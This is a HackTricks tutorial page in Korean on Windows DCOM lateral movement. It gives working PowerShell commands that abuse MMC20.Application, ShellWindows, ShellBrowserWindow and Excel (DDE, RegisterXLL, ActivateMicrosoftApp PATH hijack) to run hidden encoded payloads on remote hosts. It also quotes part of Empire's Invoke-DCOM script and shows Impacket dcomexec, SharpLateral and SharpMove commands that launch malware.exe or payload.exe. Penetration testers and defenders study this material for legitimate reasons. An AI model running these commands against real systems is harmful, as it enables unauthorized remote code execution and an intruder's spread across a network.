# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement는 기존에 노출된 COM servers를 RPC/DCOM 위에서 재사용하고 service나 scheduled task를 생성하지 않기 때문에 매력적입니다. 실제로 이는 초기 연결이 보통 TCP/135에서 시작한 뒤 동적으로 할당된 높은 RPC ports로 이동한다는 뜻입니다.

## Prerequisites & Gotchas

- 보통 target에서 local administrator context가 필요하고, remote COM server는 remote launch/activation을 허용해야 합니다.
- **2023년 3월 14일** 이후 Microsoft는 지원되는 systems에 대해 DCOM hardening을 강제합니다. 낮은 activation authentication level을 요청하는 오래된 clients는 최소 `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`를 협상하지 않으면 실패할 수 있습니다. 최신 Windows clients는 보통 자동으로 상향되므로, 현재 tooling은 일반적으로 계속 동작합니다.
- 수동 또는 스크립트 기반 DCOM execution은 일반적으로 TCP/135와 target의 동적 RPC port range가 필요합니다. Impacket의 `dcomexec.py`를 사용하고 command output을 돌려받고 싶다면, 보통 SMB access to `ADMIN$`(또는 다른 writable/readable share)도 필요합니다.
- RPC/DCOM은 동작하지만 SMB가 차단된 경우, `dcomexec.py -nooutput`는 여전히 blind execution에 유용할 수 있습니다.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**이 기법에 대한 더 많은 정보는 [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)의 원문 게시글을 확인하세요.**

Distributed Component Object Model (DCOM) objects는 네트워크 기반 상호작용을 위해 객체와 연결하는 흥미로운 기능을 제공합니다. Microsoft는 DCOM과 Component Object Model (COM) 둘 다에 대한 포괄적인 문서를 제공하며, [여기에서 DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx)과 [여기에서 COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)에 접근할 수 있습니다. DCOM 애플리케이션 목록은 PowerShell 명령으로 가져올 수 있습니다:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object인 [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)는 MMC snap-in 작업의 스크립팅을 가능하게 합니다. 특히 이 object에는 `Document.ActiveView` 아래에 `ExecuteShellCommand` method가 포함되어 있습니다. 이 method에 대한 더 많은 정보는 [여기](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)에서 확인할 수 있습니다. 실행해 보세요:

이 기능은 DCOM application을 통해 network over commands 실행을 가능하게 합니다. admin으로 DCOM에 remotely 상호작용하려면, PowerShell을 다음과 같이 사용할 수 있습니다:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
이 명령은 DCOM 애플리케이션에 연결하고 COM object의 instance를 반환합니다. 그런 다음 ExecuteShellCommand method를 호출하여 원격 host에서 process를 실행할 수 있습니다. 이 process는 다음 단계로 진행됩니다:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE 획득:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
마지막 인자는 window style입니다. `7`은 window를 최소화된 상태로 유지합니다. 운영상 MMC 기반 실행은 일반적으로 원격 `mmc.exe` process가 payload를 spawn하게 만들며, 이는 아래의 Explorer-backed objects와는 다릅니다.

## ShellWindows & ShellBrowserWindow

**이 technique에 대한 자세한 내용은 원본 post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)를 확인하세요**

**MMC20.Application** object는 명시적인 "LaunchPermissions"가 없는 것으로 확인되었으며, 기본적으로 Administrators access를 허용하는 permissions로 설정됩니다. 자세한 내용은 [여기](https://twitter.com/tiraniddo/status/817532039771525120)에서 thread를 확인할 수 있으며, 명시적인 Launch Permission이 없는 objects를 필터링하기 위해 [@tiraniddo](https://twitter.com/tiraniddo)의 OleView .NET 사용을 권장합니다.

`ShellBrowserWindow`와 `ShellWindows` 두 개의 특정 object는 명시적인 Launch Permissions가 없다는 점 때문에 강조되었습니다. `HKCR:\AppID\{guid}` 아래에 `LaunchPermission` registry entry가 없다는 것은 명시적인 permissions가 없음을 의미합니다.

`MMC20.Application`과 비교했을 때, 이들 object는 원격 호스트에서 command가 보통 `mmc.exe` 대신 `explorer.exe`의 child로 끝나기 때문에 OPSEC 관점에서 더 조용한 편입니다.

### ShellWindows

ProgID가 없는 `ShellWindows`의 경우, .NET methods `Type.GetTypeFromCLSID`와 `Activator.CreateInstance`가 AppID를 사용한 object instantiation을 가능하게 합니다. 이 과정은 `ShellWindows`의 CLSID를 가져오기 위해 OleView .NET을 활용합니다. 일단 instantiated 되면 `WindowsShell.Item` method를 통해 interaction이 가능하며, `Document.Application.ShellExecute` 같은 method invocation으로 이어집니다.

object를 instantiated하고 원격으로 commands를 실행하는 예시 PowerShell commands가 제공되었습니다:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow`는 비슷하지만, CLSID를 통해 직접 인스턴스화할 수 있으며 `Document.Application.ShellExecute`로 pivot할 수 있습니다:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objects를 사용한 Lateral Movement

DCOM Excel objects를 악용하여 lateral movement를 수행할 수 있습니다. 자세한 정보는 [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)에서 DCOM을 통한 lateral movement를 위해 Excel DDE를 활용하는 방법에 대한 논의를 읽어보는 것이 좋습니다.

Empire 프로젝트는 DCOM objects를 조작하여 Excel을 remote code execution (RCE)에 활용하는 방법을 보여주는 PowerShell script를 제공합니다. 아래는 [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)에서 제공되는 script의 일부로, Excel을 RCE에 악용하는 여러 방법을 보여줍니다:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
최근 연구에서는 `Excel.Application`의 `ActivateMicrosoftApp()` 메서드로 이 영역이 확장되었습니다. 핵심 아이디어는 Excel이 시스템 `PATH`를 검색해 FoxPro, Schedule Plus, Project 같은 레거시 Microsoft 애플리케이션을 실행하려고 시도할 수 있다는 점입니다. 운영자가 대상의 `PATH`에 포함된 쓰기 가능한 위치에 이러한 예상 이름 중 하나를 가진 payload를 배치할 수 있다면, Excel이 이를 실행합니다.

이 변형의 요구 사항:

- 대상에 대한 Local admin
- 대상에 Excel 설치
- 대상의 `PATH`에 있는 writable directory에 payload를 쓸 수 있는 능력

FoxPro lookup(`FOXPROW.exe`)를 악용하는 실제 예시:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
공격 호스트에 로컬 `Excel.Application` ProgID가 등록되어 있지 않다면, 대신 CLSID로 원격 객체를 인스턴스화하십시오:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
실제로 악용되는 값:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Lateral Movement를 위한 Automation Tools

이러한 techniques를 자동화하기 위해 강조되는 두 가지 tools가 있습니다:

- **Invoke-DCOM.ps1**: 원격 machines에서 code를 실행하기 위한 다양한 methods의 호출을 단순화하는, Empire project에서 제공하는 PowerShell script입니다. 이 script는 Empire GitHub repository에서 접근할 수 있습니다.

- **SharpLateral**: code를 원격으로 실행하도록 설계된 tool로, 다음 command와 함께 사용할 수 있습니다:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- Powershell 스크립트 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)는 다른 머신에서 코드 실행을 위한 주석 처리된 모든 방법을 쉽게 호출할 수 있게 해준다.
- Impacket의 `dcomexec.py`를 사용해 DCOM을 이용하여 원격 시스템에서 명령을 실행할 수 있다. 현재 빌드는 `ShellWindows`, `ShellBrowserWindow`, `MMC20`을 지원하며, 기본값은 `ShellWindows`이다.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- [**SharpLateral**](https://github.com/mertdas/SharpLateral)도 사용할 수 있습니다:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [**SharpMove**](https://github.com/0xthirteen/SharpMove)도 사용할 수 있습니다
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
